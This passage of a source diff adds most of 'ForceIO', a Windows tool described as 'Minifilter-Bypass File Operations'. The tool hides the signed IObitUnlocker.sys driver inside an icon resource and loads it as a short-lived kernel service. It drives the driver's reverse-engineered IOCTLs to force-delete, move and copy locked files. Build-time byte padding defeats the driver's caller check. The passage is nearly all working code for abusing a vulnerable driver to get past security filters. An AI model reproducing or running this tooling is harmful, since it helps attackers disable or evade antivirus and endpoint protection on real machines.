+        int n = WideCharToMultiByte(CP_UTF8, 0, msg, chunk, buf, sizeof(buf) - 1, 0, 0);
+        if (n <= 0) return;
+        DWORD offset = 0;
+        while (offset < (DWORD)n) {
+            if (!WriteFile(h, buf + offset, (DWORD)n - offset, &written, 0) || !written)
+                return;
+            offset += written;
+        }
+        msg += chunk;
+        len -= chunk;
+    }
+}
+
+void Con_Init(void) {
+    hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+    hErr = GetStdHandle(STD_ERROR_HANDLE);
+}
+
+void Con_Print(const wchar_t* msg) { emit(hOut, msg); }
+void Con_Error(const wchar_t* msg) { emit(hErr, msg); }
+
+BOOL Con_ConfirmOverwrite(const wchar_t* path) {
+    char answer[16];
+    DWORD read = 0;
+    Con_Error(L"Destination already exists: ");
+    Con_Error(path);
+    Con_Error(L"\r\nOverwrite? [y/N] ");
+    if (!ReadFile(GetStdHandle(STD_INPUT_HANDLE), answer, sizeof(answer), &read, NULL) || !read)
+        return FALSE;
+    DWORD start = 0;
+    while (start < read && (answer[start] == ' ' || answer[start] == '\t')) start++;
+    if (start >= read || (answer[start] != 'y' && answer[start] != 'Y')) return FALSE;
+    start++;
+    while (start < read && (answer[start] == ' ' || answer[start] == '\t')) start++;
+    // Accept a single Y only. A full buffer without a terminator is rejected.
+    return start < read && (answer[start] == '\r' || answer[start] == '\n');
+}
+
+void Con_Hex32(unsigned long val) {
+    wchar_t buf[11];
+    buf[0] = L'0'; buf[1] = L'x';
+    for (int i = 9; i >= 2; i--) {
+        int nib = val & 0xF;
+        buf[i] = (nib < 10) ? (wchar_t)(L'0' + nib) : (wchar_t)(L'A' + nib - 10);
+        val >>= 4;
+    }
+    buf[10] = 0;
+    Con_Print(buf);
+}
+
+void Con_Dec(unsigned long val) {
+    wchar_t buf[16];
+    int i = 14;
+    buf[15] = 0;
+    if (val == 0) { Con_Print(L"0"); return; }
+    while (val > 0 && i >= 0) {
+        buf[i--] = (wchar_t)(L'0' + (val % 10));
+        val /= 10;
+    }
+    Con_Print(&buf[i + 1]);
+}
+
+```
+
+`src/Console.h`:
+
+```h
+// Console.h
+// No-CRT console output for ForceIO.
+// © WESMAR Marek Wesołowski
+
+#pragma once
+
+#include <windows.h>
+
+void Con_Init(void);
+void Con_Print(const wchar_t* msg);
+void Con_Error(const wchar_t* msg);
+void Con_Hex32(unsigned long val);
+void Con_Dec(unsigned long val);
+BOOL Con_ConfirmOverwrite(const wchar_t* path);
+
+```
+
+`src/DeviceIO.c`:
+
+```c
+// DeviceIO.c
+// IOCTL protocol implementation for IObitUnlocker.sys.
+//
+// The driver validates the calling process by reading its EXE from disk and
+// computing two checksums (XOR == 0x2B, alternating add/sub == 0x00A88677).
+// The build script appends correction bytes to satisfy this check at compile time.
+//
+// © WESMAR Marek Wesołowski
+
+#include "DeviceIO.h"
+#include "PathSafety.h"
+
+#define DEVICE_PATH      L"\\\\.\\IObitUnlockerDevice"
+#define IOCTL_ULK_OP     0x00222124u
+#define IOCTL_ULK_QRY    0x00222128u
+#define BUFFER_SIZE      0x428
+
+#define OP_DELETE    1
+#define OP_RENAME    2
+#define OP_MOVE      3
+#define OP_COPY      4
+
+#pragma pack(push, 1)
+typedef struct {
+    wchar_t SourcePath[264];   // +0x000 (0x210 bytes)
+    wchar_t DestPath[264];     // +0x210 (0x210 bytes)
+    ULONG   OpType;            // +0x420
+    ULONG   Flags;             // +0x424
+} ULK_BUFFER;
+#pragma pack(pop)
+
+typedef char static_assert_size[(sizeof(ULK_BUFFER) == BUFFER_SIZE) ? 1 : -1];
+
+#pragma function(memset)
+void* memset(void* dest, int val, size_t count) {
+    unsigned char* p = (unsigned char*)dest;
+    while (count--) *p++ = (unsigned char)val;
+    return dest;
+}
+
+static void wcopy_safe(wchar_t* dst, const wchar_t* src, int max_chars) {
+    int i = 0;
+    while (i < max_chars - 1 && src[i]) { dst[i] = src[i]; i++; }
+    dst[i] = 0;
+}
+
+static DWORD SendOperation(HANDLE hDev, const wchar_t* src, const wchar_t* dst, ULONG op) {
+    DWORD safetyError = dst ? PathSafety_CheckPair(src, dst) : PathSafety_Check(src);
+    if (safetyError) return safetyError;
+
+    wchar_t fullSrc[FORCEIO_PATH_CAPACITY];
+    wchar_t fullDst[FORCEIO_PATH_CAPACITY];
+    DWORD resSrc = PathSafety_Resolve(src, fullSrc);
+    const wchar_t* targetSrc = (resSrc == ERROR_SUCCESS) ? fullSrc : src;
+    const wchar_t* targetDst = dst;
+    if (dst && dst[0]) {
+        DWORD resDst = PathSafety_Resolve(dst, fullDst);
+        targetDst = (resDst == ERROR_SUCCESS) ? fullDst : dst;
+    }
+
+    ULK_BUFFER buf;
+    memset(&buf, 0, sizeof(buf));
+
+    wcopy_safe(buf.SourcePath, targetSrc, 264);
+    if (targetDst && targetDst[0])
+        wcopy_safe(buf.DestPath, targetDst, 264);
+
+    buf.OpType = op;
+    buf.Flags  = 3;
+
+    ULONG out = 0;
+    DWORD ret = 0;
+
+    SetLastError(0);
+    DeviceIoControl(hDev, IOCTL_ULK_OP, &buf, BUFFER_SIZE, &out, 4, &ret, NULL);
+    return GetLastError();
+}
+
+HANDLE DeviceIO_Open(void) {
+    return CreateFileW(DEVICE_PATH,
+        GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL, OPEN_EXISTING, 0, NULL);
+}
+
+void DeviceIO_Close(HANDLE hDev) {
+    if (hDev && hDev != INVALID_HANDLE_VALUE)
+        CloseHandle(hDev);
+}
+
+static int wlen(const wchar_t* s) {
+    const wchar_t* p = s;
+    while (*p) p++;
+    return (int)(p - s);
+}
+
+static DWORD path_join(wchar_t* dst, const wchar_t* dir, const wchar_t* name, int max) {
+    int dirLength = wlen(dir), nameLength = wlen(name);
+    int separator = dirLength > 0 && dir[dirLength - 1] != L'\\';
+    if (dirLength + separator + nameLength >= max)
+        return ERROR_FILENAME_EXCED_RANGE;
+    wcopy_safe(dst, dir, max);
+    int len = wlen(dst);
+    if (len > 0 && len < max - 2 && dst[len - 1] != L'\\') {
+        dst[len] = L'\\';
+        dst[len + 1] = 0;
+        len++;
+    }
+    int i = 0;
+    while (len + i < max - 1 && name[i]) {
+        dst[len + i] = name[i];
+        i++;
+    }
+    dst[len + i] = 0;
+    return ERROR_SUCCESS;
+}
+
+static DWORD DeleteRecursive(HANDLE hDev, const wchar_t* path);
+static DWORD CopyRecursive(HANDLE hDev, const wchar_t* src, const wchar_t* dst);
+
+static DWORD DeleteDirectoryContents(HANDLE hDev, const wchar_t* dir) {
+    wchar_t pattern[MAX_PATH + 4];
+    DWORD joinError = path_join(pattern, dir, L"*", MAX_PATH + 4);
+    if (joinError) return joinError;
+
+    WIN32_FIND_DATAW fd;
+    HANDLE hFind = FindFirstFileW(pattern, &fd);
+    if (hFind == INVALID_HANDLE_VALUE)
+        return GetLastError();
+
+    DWORD result = 0;
+    do {
+        if (fd.cFileName[0] == L'.' &&
+            (fd.cFileName[1] == 0 || (fd.cFileName[1] == L'.' && fd.cFileName[2] == 0)))
+            continue;
+
+        wchar_t child[MAX_PATH + 4];
+        joinError = path_join(child, dir, fd.cFileName, MAX_PATH + 4);
+        if (joinError) { result = joinError; break; }
+
+        DWORD err = DeleteRecursive(hDev, child);
+        if (err && !result) result = err;
+    } while (FindNextFileW(hFind, &fd));
+
+    DWORD enumerationError = GetLastError();
+    FindClose(hFind);
+    if (!result && enumerationError != ERROR_NO_MORE_FILES) result = enumerationError;
+    return result;
+}
+
+static DWORD DeleteRecursive(HANDLE hDev, const wchar_t* path) {
+    DWORD safetyError = PathSafety_Check(path);
+    if (safetyError) return safetyError;
+    DWORD attr = GetFileAttributesW(path);
+    if (attr == INVALID_FILE_ATTRIBUTES)
+        return GetLastError();
+
+    if (attr & FILE_ATTRIBUTE_DIRECTORY) {
+        DWORD err = DeleteDirectoryContents(hDev, path);
+        if (err) return err;
+    }
+
+    return SendOperation(hDev, path, NULL, OP_DELETE);
+}
+
+DWORD DeviceIO_Delete(HANDLE hDev, const wchar_t* path) {
+    DWORD safetyError = PathSafety_Check(path);
+    if (safetyError) return safetyError;
+
+    wchar_t fullPath[FORCEIO_PATH_CAPACITY];
+    DWORD resErr = PathSafety_Resolve(path, fullPath);
+    const wchar_t* targetPath = (resErr == ERROR_SUCCESS) ? fullPath : path;
+
+    DWORD attr = GetFileAttributesW(targetPath);
+    if (attr == INVALID_FILE_ATTRIBUTES)
+        return GetLastError();
+
+    return DeleteRecursive(hDev, targetPath);
+}
+
+DWORD DeviceIO_Rename(HANDLE hDev, const wchar_t* src, const wchar_t* dst) {
+    DWORD safetyError = PathSafety_CheckPair(src, dst);
+    if (safetyError) return safetyError;
+    DWORD err = SendOperation(hDev, src, dst, OP_RENAME);
+    if (err == 0)
+        return 0;
+
+    if (MoveFileExW(src, dst, MOVEFILE_COPY_ALLOWED | MOVEFILE_WRITE_THROUGH))
+        return 0;
+
+    if (GetFileAttributesW(dst) != INVALID_FILE_ATTRIBUTES)
+        return ERROR_ALREADY_EXISTS;
+
+    err = SendOperation(hDev, src, dst, OP_MOVE);
+    if (err == 0)
+        return 0;
+
+    DWORD attr = GetFileAttributesW(src);
+    if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
+        DWORD copyErr = SendOperation(hDev, src, dst, OP_COPY);
+        if (copyErr == 0)
+            return SendOperation(hDev, src, NULL, OP_DELETE);
+    }
+
+    return err;
+}
+
+// IOCTL 0x222128 input: just the path in SourcePath (first 264 WCHARs).
+// Output: single WCHAR string "exe_path,PID|exe_path,PID|..." (pipe after each entry).
+// Output buffer must be at least 64 KB; driver returns ERROR_INSUFFICIENT_BUFFER otherwise.
+// This function allocates the output buffer with VirtualAlloc; caller must
+// VirtualFree(*outBuf, 0, MEM_RELEASE) on success (*outBuf != NULL).
+DWORD DeviceIO_QueryLocks(HANDLE hDev, const wchar_t* path,
+                          wchar_t** outBuf, DWORD* outChars) {
+    *outBuf   = NULL;
+    *outChars = 0;
+
+    wchar_t fullPath[FORCEIO_PATH_CAPACITY];
+    DWORD resErr = PathSafety_Resolve(path, fullPath);
+    const wchar_t* targetPath = (resErr == ERROR_SUCCESS) ? fullPath : path;
+
+    int i;
+    for (i = 0; i < 263 && targetPath[i]; i++) {}
+    if (targetPath[i]) return ERROR_FILENAME_EXCED_RANGE;
+
+    wchar_t inPath[264];
+    for (i = 0; i < 264; i++) inPath[i] = 0;
+    for (i = 0; i < 263 && targetPath[i]; i++) inPath[i] = targetPath[i];
+
+    // Try output sizes: 64 KB → 128 KB → 256 KB → 512 KB
+    static const DWORD kSizes[] = { 0x10000, 0x20000, 0x40000, 0x80000, 0 };
+    int si;
+    for (si = 0; kSizes[si]; si++) {
+        wchar_t* buf = (wchar_t*)VirtualAlloc(NULL, kSizes[si],
+                                              MEM_COMMIT | MEM_RESERVE,
+                                              PAGE_READWRITE);
+        if (!buf) return GetLastError();
+
+        DWORD returned = 0;
+        SetLastError(0);
+        DeviceIoControl(hDev, IOCTL_ULK_QRY,
+                        inPath, (DWORD)(264 * sizeof(wchar_t)),
+                        buf, kSizes[si], &returned, NULL);
+        DWORD err = GetLastError();
+
+        if (err == ERROR_INSUFFICIENT_BUFFER) {
+            VirtualFree(buf, 0, MEM_RELEASE);
+            continue;
+        }
+        if (err != 0) {
+            VirtualFree(buf, 0, MEM_RELEASE);
+            return err;
+        }
+
+        *outBuf   = buf;
+        *outChars = returned / (DWORD)sizeof(wchar_t);
+        return 0;
+    }
+    return ERROR_INSUFFICIENT_BUFFER;
+}
+
+DWORD DeviceIO_Copy(HANDLE hDev, const wchar_t* src, const wchar_t* dst) {
+    DWORD safetyError = PathSafety_CheckPair(src, dst);
+    if (safetyError) return safetyError;
+    return CopyRecursive(hDev, src, dst);
+}
+
+static DWORD CopyDirectoryContents(HANDLE hDev, const wchar_t* srcDir, const wchar_t* dstDir) {
+    wchar_t pattern[MAX_PATH + 4];
+    DWORD joinError = path_join(pattern, srcDir, L"*", MAX_PATH + 4);
+    if (joinError) return joinError;
+
+    WIN32_FIND_DATAW fd;
+    HANDLE hFind = FindFirstFileW(pattern, &fd);
+    if (hFind == INVALID_HANDLE_VALUE)
+        return GetLastError();
+
+    DWORD result = 0;
+    do {
+        if (fd.cFileName[0] == L'.' &&
+            (fd.cFileName[1] == 0 || (fd.cFileName[1] == L'.' && fd.cFileName[2] == 0)))
+            continue;
+
+        wchar_t childSrc[MAX_PATH + 4];
+        wchar_t childDst[MAX_PATH + 4];
+        joinError = path_join(childSrc, srcDir, fd.cFileName, MAX_PATH + 4);
+        if (!joinError) joinError = path_join(childDst, dstDir, fd.cFileName, MAX_PATH + 4);
+        if (joinError) { result = joinError; break; }
+
+        DWORD err = CopyRecursive(hDev, childSrc, childDst);
+        if (err && !result) result = err;
+    } while (FindNextFileW(hFind, &fd));
+
+    DWORD enumerationError = GetLastError();
+    FindClose(hFind);
+    if (!result && enumerationError != ERROR_NO_MORE_FILES) result = enumerationError;
+    return result;
+}
+
+static DWORD CopyRecursive(HANDLE hDev, const wchar_t* src, const wchar_t* dst) {
+    DWORD safetyError = PathSafety_CheckPair(src, dst);
+    if (safetyError) return safetyError;
+    DWORD attr = GetFileAttributesW(src);
+    if (attr == INVALID_FILE_ATTRIBUTES)
+        return GetLastError();
+
+    DWORD dstAttr = GetFileAttributesW(dst);
+
+    if (attr & FILE_ATTRIBUTE_DIRECTORY) {
+        DWORD err = SendOperation(hDev, src, dst, OP_COPY);
+        if (err == 0)
+            return 0;
+
+        if (dstAttr == INVALID_FILE_ATTRIBUTES) {
+            if (!CreateDirectoryW(dst, NULL))
+                return GetLastError();
+        } else if (!(dstAttr & FILE_ATTRIBUTE_DIRECTORY)) {
+            return ERROR_ALREADY_EXISTS;
+        }
+
+        return CopyDirectoryContents(hDev, src, dst);
+    }
+
+    if (dstAttr != INVALID_FILE_ATTRIBUTES)
+        return ERROR_ALREADY_EXISTS;
+
+    return SendOperation(hDev, src, dst, OP_COPY);
+}
+
+```
+
+`src/DeviceIO.h`:
+
+```h
+// DeviceIO.h
+// IOCTL protocol interface for IObitUnlocker.sys.
+//
+// Reversed from IObitUnlocker.sys v1.3.0.10 (WHCP signed):
+//
+// IOCTL 0x222124 — File operations (METHOD_BUFFERED):
+//   Input:  0x428 bytes
+//   +0x000  WCHAR SourcePath[264]
+//   +0x210  WCHAR DestPath[264]
+//   +0x420  ULONG OperationType  (1=delete, 2=raw rename, 3=move, 4=copy)
+//   +0x424  ULONG Flags          (always 3 in practice)
+//   Output: ULONG (4 bytes, ignored)
+//
+// IOCTL 0x222128 — Handle query (METHOD_BUFFERED):
+//   Input:  WCHAR Path[264] (528 bytes; DestPath/OpType/Flags ignored)
+//   Output: WCHAR string "exe_path,PID|exe_path,PID|..." (pipe after every entry)
+//           Output buffer must be >= 64 KB (ERROR_INSUFFICIENT_BUFFER if smaller).
+//           Empty string (0 bytes returned) means no process locks the file.
+//   Dispatch: driver uses SUB IOCTL, 0x222124 → CMP result, 4 → handler.
+//
+// © WESMAR Marek Wesołowski
+
+#pragma once
+
+#include <windows.h>
+
+HANDLE DeviceIO_Open(void);
+void   DeviceIO_Close(HANDLE hDev);
+
+// Each returns the Win32 error code (0 = success).
+DWORD  DeviceIO_Delete(HANDLE hDev, const wchar_t* path);
+DWORD  DeviceIO_Rename(HANDLE hDev, const wchar_t* src, const wchar_t* dst);
+DWORD  DeviceIO_Copy(HANDLE hDev, const wchar_t* src, const wchar_t* dst);
+
+// IOCTL 0x222128: query which processes lock a file.
+// Output is a WCHAR string "exe_path,PID|exe_path,PID|..." (pipe after every entry, including last).
+// Returns 0 on success; *outBuf allocated with VirtualAlloc — caller must
+// VirtualFree(*outBuf, 0, MEM_RELEASE). *outChars = number of wide chars in output.
+// Empty file (not locked) → *outBuf non-NULL, *outChars == 0.
+DWORD  DeviceIO_QueryLocks(HANDLE hDev, const wchar_t* path, wchar_t** outBuf, DWORD* outChars);
+
+```
+
+`src/DriverExtract.c`:
+
+```c
+// DriverExtract.c
+// FDI in-memory decompression of the driver payload from icon+CAB resource.
+//
+// IDR_DRIVER_PAYLOAD layout (built by build.ps1):
+//   [ICO header (ICON_HEADER_SIZE bytes)] [LZX-CAB containing forceio.dat]
+//
+// © WESMAR Marek Wesołowski
+
+#include "DriverExtract.h"
+#include "GenIconSize.h"
+#include "Resource.h"
+
+#include <fdi.h>
+
+#ifndef SEEK_SET
+#define SEEK_SET 0
+#define SEEK_CUR 1
+#define SEEK_END 2
+#endif
+
+#pragma comment(lib, "Cabinet.lib")
+
+#pragma function(memcpy)
+void* memcpy(void* dst, const void* src, size_t count) {
+    unsigned char* d = (unsigned char*)dst;
+    const unsigned char* s = (const unsigned char*)src;
+    while (count--) *d++ = *s++;
+    return dst;
+}
+
+// ─── FDI in-memory state ───────────────────────────────────────────────────
+
+static struct {
+    const BYTE* cabPtr;
+    SIZE_T      cabOff;
+    SIZE_T      cabEnd;
+    BYTE*       outPtr;
+    SIZE_T      outUsed;
+    SIZE_T      outCap;
+} g_fdi;
+
+// ─── FDI callbacks ─────────────────────────────────────────────────────────
+
+static LPVOID DIAMONDAPI fdi_alloc(ULONG cb) {
+    return HeapAlloc(GetProcessHeap(), 0, cb);
+}
+
+static void DIAMONDAPI fdi_free(LPVOID pv) {
+    HeapFree(GetProcessHeap(), 0, pv);
+}
+
+static INT_PTR DIAMONDAPI fdi_open(char* pszFile, int oflag, int pmode) {
+    (void)pszFile; (void)oflag; (void)pmode;
+    return 1;
+}
+
+static UINT DIAMONDAPI fdi_read(INT_PTR hf, void* pv, UINT cb) {
+    (void)hf;
+    SIZE_T avail = g_fdi.cabEnd - g_fdi.cabOff;
+    if (cb > (UINT)avail) cb = (UINT)avail;
+    if (cb > 0) { memcpy(pv, g_fdi.cabPtr + g_fdi.cabOff, cb); g_fdi.cabOff += cb; }
+    return cb;
+}
+
+static UINT DIAMONDAPI fdi_write(INT_PTR hf, void* pv, UINT cb) {
+    (void)hf;
+    if (g_fdi.outUsed + cb > g_fdi.outCap) return 0;
+    memcpy(g_fdi.outPtr + g_fdi.outUsed, pv, cb);
+    g_fdi.outUsed += cb;
+    return cb;
+}
+
+static int DIAMONDAPI fdi_close(INT_PTR hf) {
+    (void)hf;
+    return 0;
+}
+
+static long DIAMONDAPI fdi_seek(INT_PTR hf, long dist, int seektype) {
+    (void)hf;
+    long newPos;
+    if (seektype == SEEK_SET)      newPos = dist;
+    else if (seektype == SEEK_CUR) newPos = (long)g_fdi.cabOff + dist;
+    else                           newPos = (long)g_fdi.cabEnd + dist;
+    if (newPos < 0) newPos = 0;
+    if ((SIZE_T)newPos > g_fdi.cabEnd) newPos = (long)g_fdi.cabEnd;
+    g_fdi.cabOff = (SIZE_T)newPos;
+    return newPos;
+}
+
+static INT_PTR DIAMONDAPI fdi_notify(FDINOTIFICATIONTYPE fdint, PFDINOTIFICATION pfdin) {
+    (void)pfdin;
+    if (fdint == fdintCOPY_FILE)       return 1;
+    if (fdint == fdintCLOSE_FILE_INFO) return TRUE;
+    return 0;
+}
+
+// ─── Public API ────────────────────────────────────────────────────────────
+
+BOOL DriverExtract_Deploy(const wchar_t* destFullPath) {
+    HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_DRIVER_PAYLOAD), RT_RCDATA);
+    if (!hRes) return FALSE;
+
+    DWORD totalSize = SizeofResource(NULL, hRes);
+    if (totalSize <= ICON_HEADER_SIZE + 4) return FALSE;
+
+    HGLOBAL hGlob = LoadResource(NULL, hRes);
+    if (!hGlob) return FALSE;
+    const BYTE* raw = (const BYTE*)LockResource(hGlob);
+    if (!raw) return FALSE;
+
+    SIZE_T cabSize = totalSize - ICON_HEADER_SIZE;
+
+    static const SIZE_T kOutCap = 256 * 1024;
+    BYTE* outBuf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, kOutCap);
+    if (!outBuf) return FALSE;
+
+    g_fdi.cabPtr  = raw + ICON_HEADER_SIZE;
+    g_fdi.cabOff  = 0;
+    g_fdi.cabEnd  = cabSize;
+    g_fdi.outPtr  = outBuf;
+    g_fdi.outUsed = 0;
+    g_fdi.outCap  = kOutCap;
+
+    ERF erf;
+    erf.erfOper = 0; erf.erfType = 0; erf.fError = FALSE;
+
+    HFDI hfdi = FDICreate(fdi_alloc, fdi_free, fdi_open, fdi_read,
+                          fdi_write, fdi_close, fdi_seek, cpuUNKNOWN, &erf);
+    if (!hfdi) { HeapFree(GetProcessHeap(), 0, outBuf); return FALSE; }
+
+    BOOL ok = FDICopy(hfdi, (char*)"memory.cab", (char*)"", 0, fdi_notify, NULL, NULL);
+    FDIDestroy(hfdi);
+
+    if (!ok || g_fdi.outUsed == 0) {
+        HeapFree(GetProcessHeap(), 0, outBuf);
+        return FALSE;
+    }
+
+    HANDLE hFile = CreateFileW(destFullPath, GENERIC_WRITE, 0, NULL,
+                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        HeapFree(GetProcessHeap(), 0, outBuf);
+        return (GetFileAttributesW(destFullPath) != INVALID_FILE_ATTRIBUTES);
+    }
+
+    DWORD written = 0;
+    DWORD toWrite = (DWORD)g_fdi.outUsed;
+    BOOL writeOk = WriteFile(hFile, outBuf, toWrite, &written, NULL);
+    CloseHandle(hFile);
+
+    HeapFree(GetProcessHeap(), 0, outBuf);
+    g_fdi.outPtr  = NULL;
+    g_fdi.outUsed = 0;
+
+    return (writeOk && written == toWrite);
+}
+
+```
+
+`src/DriverExtract.h`:
+
+```h
+// DriverExtract.h
+// FDI in-memory decompression of the driver payload from icon+CAB resource.
+// © WESMAR Marek Wesołowski
+
+#pragma once
+
+#include <windows.h>
+
+// Decompresses forceio.dat from the embedded icon+CAB resource
+// and writes it to destFullPath. Returns TRUE on success or if
+// the file is already present (locked by running driver).
+BOOL DriverExtract_Deploy(const wchar_t* destFullPath);
+
+```
+
+`src/DriverSession.c`:
+
+```c
+// DriverSession.c
+// Atomic driver session lifecycle for ForceIO.
+//
+// Begin: pre-cleanup → FDI extract to %SystemRoot%\forceio.dat →
+//        create SCM service "IObitUnlocker" → start → open device handle.
+// End:   close device → stop → delete service → remove driver file.
+//
+// Service never persists in registry between operations.
+//
+// © WESMAR Marek Wesołowski
+
+#include "DriverSession.h"
+#include "DriverExtract.h"
+#include "DeviceIO.h"
+#include <winsvc.h>
+
+#pragma comment(lib, "advapi32.lib")
+
+#define SERVICE_NAME L"IObitUnlocker"
+
+static wchar_t g_driverPath[MAX_PATH];
+
+static void wcat(wchar_t* dst, const wchar_t* src, int max) {
+    int base = 0;
+    while (dst[base]) base++;
+    int i = 0;
+    while (i < max - base - 1 && src[i]) { dst[base + i] = src[i]; i++; }
+    dst[base + i] = 0;
+}
+
+static void BuildDriverPath(void) {
+    if (g_driverPath[0]) return;
+    GetWindowsDirectoryW(g_driverPath, MAX_PATH - 32);
+    wcat(g_driverPath, L"\\forceio.dat", MAX_PATH);
+}
+
+// ─── Internal SCM operations ───────────────────────────────────────────────
+
+static void SvcStop(void) {
+    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (!scm) return;
+    SC_HANDLE svc = OpenServiceW(scm, SERVICE_NAME, SERVICE_STOP | SERVICE_QUERY_STATUS);
+    if (svc) {
+        SERVICE_STATUS st;
+        ControlService(svc, SERVICE_CONTROL_STOP, &st);
+        CloseServiceHandle(svc);
+    }
+    CloseServiceHandle(scm);
+}
+
+static void SvcDelete(void) {
+    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (!scm) return;
+    SC_HANDLE svc = OpenServiceW(scm, SERVICE_NAME, DELETE);
+    if (svc) {
+        DeleteService(svc);
+        CloseServiceHandle(svc);
+    }
+    CloseServiceHandle(scm);
+}
+
+static BOOL SvcCreateAndStart(void) {
+    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (!scm) return FALSE;
+
+    SC_HANDLE svc = NULL;
+
+    for (int attempt = 0; attempt < 3; attempt++) {
+        svc = CreateServiceW(scm, SERVICE_NAME, SERVICE_NAME,
+                             SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
+                             SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
+                             L"forceio.dat", NULL, NULL, NULL, NULL, NULL);
+        if (svc) break;
+
+        DWORD err = GetLastError();
+        if (err == ERROR_SERVICE_EXISTS) {
+            svc = OpenServiceW(scm, SERVICE_NAME, SERVICE_ALL_ACCESS);
+            if (svc) {
+                ChangeServiceConfigW(svc, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
+                                     SERVICE_ERROR_IGNORE, L"forceio.dat",
+                                     NULL, NULL, NULL, NULL, NULL, SERVICE_NAME);
+            }
+            break;
+        }
+        if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
+            continue;
+        }
+        break;
+    }
+
+    if (!svc) {
+        CloseServiceHandle(scm);
+        return FALSE;
+    }
+
+    BOOL ok = StartServiceW(svc, 0, NULL);
+    if (!ok) {
+        DWORD err = GetLastError();
+        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
+            ok = TRUE;
+        } else if (err == ERROR_SERVICE_DISABLED) {
+            ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_DEMAND_START,
+                                 SERVICE_NO_CHANGE, NULL,
+                                 NULL, NULL, NULL, NULL, NULL, NULL);
+            ok = StartServiceW(svc, 0, NULL);
+            if (!ok && GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
+                ok = TRUE;
+        }
+    }
+
+    CloseServiceHandle(svc);
+    CloseServiceHandle(scm);
+    return ok;
+}
+
+// ─── Public API ────────────────────────────────────────────────────────────
+
+HANDLE DriverSession_Begin(void) {
+    BuildDriverPath();
+
+    // Pre-cleanup: remove leftovers from crashed session
+    SvcStop();
+    SvcDelete();
+
+    if (!DriverExtract_Deploy(g_driverPath))
+        return INVALID_HANDLE_VALUE;
+
+    if (!SvcCreateAndStart()) {
+        DeleteFileW(g_driverPath);
+        return INVALID_HANDLE_VALUE;
+    }
+
+    HANDLE hDev = DeviceIO_Open();
+    if (hDev == INVALID_HANDLE_VALUE) {
+        SvcStop();
+        SvcDelete();
+        DeleteFileW(g_driverPath);
+    }
+    return hDev;
+}
+
+void DriverSession_End(HANDLE hDev) {
+    DeviceIO_Close(hDev);
+    SvcStop();
+    SvcDelete();
+    BuildDriverPath();
+    DeleteFileW(g_driverPath);
+}
+
+BOOL DriverSession_Start(void) {
+    BuildDriverPath();
+    SvcStop();
+    SvcDelete();
+    if (!DriverExtract_Deploy(g_driverPath))
+        return FALSE;
+    return SvcCreateAndStart();
+}
+
+void DriverSession_Stop(void) {
+    SvcStop();
+}
+
+void DriverSession_Cleanup(void) {
+    SvcStop();
+    SvcDelete();
+    BuildDriverPath();
+    DeleteFileW(g_driverPath);
+}
+
+```
+
+`src/DriverSession.h`:
+
+```h
+// DriverSession.h
+// Atomic driver session lifecycle for ForceIO.
+//
+// Normal file operations use Begin/End — the driver service exists in SCM
+// only for the duration of the operation, never persists in registry.
+//
+// © WESMAR Marek Wesołowski
+
+#pragma once
+
+#include <windows.h>
+
+// Atomic session: extract → create service → start → open device.
+// Returns device handle for DeviceIO operations.
+// Caller MUST call DriverSession_End when done.
+HANDLE DriverSession_Begin(void);
+
+// Close device → stop service → delete service → remove driver file.
+void DriverSession_End(HANDLE hDev);
+
+// Manual CLI commands (debugging):
+BOOL DriverSession_Start(void);
+void DriverSession_Stop(void);
+void DriverSession_Cleanup(void);
+
+```
+
+`src/ForceIO.manifest`:
+
+```manifest
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+
+```
+
+`src/ForceIO.rc`:
+
+```rc
+#pragma code_page(65001)
+
+#include "Resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+#include "winres.h"
+#undef APSTUDIO_READONLY_SYMBOLS
+
+LANGUAGE LANG_POLISH, SUBLANG_POLISH_POLAND
+
+MAIN_ICON            ICON                    "..\\ICON\\kvc.ico"
+IDR_DRIVER_PAYLOAD   RCDATA                  "..\\ICON\\kvc.ico"
+
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION 1,0,0,0
+ PRODUCTVERSION 1,0,0,0
+ FILEFLAGSMASK 0x3fL
+#ifdef _DEBUG
+ FILEFLAGS 0x1L
+#else
+ FILEFLAGS 0x0L
+#endif
+ FILEOS VOS_NT_WINDOWS32
+ FILETYPE VFT_APP
+ FILESUBTYPE 0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "041504B0"
+        BEGIN
+            VALUE "CompanyName", "Marek Wesołowski- wesmar"
+            VALUE "FileDescription", "ForceIO - Minifilter-Bypass File Operations"
+            VALUE "FileVersion", "1.0.0.0"
+            VALUE "InternalName", "ForceIO.exe"
+            VALUE "LegalCopyright", "Marek Wesołowski © 2026"
+            VALUE "OriginalFilename", "ForceIO.exe"
+            VALUE "ProductName", "ForceIO"
+            VALUE "ProductVersion", "1.0.0.0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x0415, 1200
+    END
+END
+
+```
+
+`src/ForceIO.vcxproj`:
+
+```vcxproj
